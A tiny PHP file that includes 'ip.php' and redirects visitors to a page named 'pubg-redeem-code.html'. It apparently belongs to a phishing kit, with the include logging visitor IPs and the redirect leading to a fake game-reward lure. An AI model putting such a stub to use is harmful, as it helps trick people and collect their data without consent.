<?php
include 'ip.php';
header('Location: forwarding_link/pubg-redeem-code.html');
exit
?>
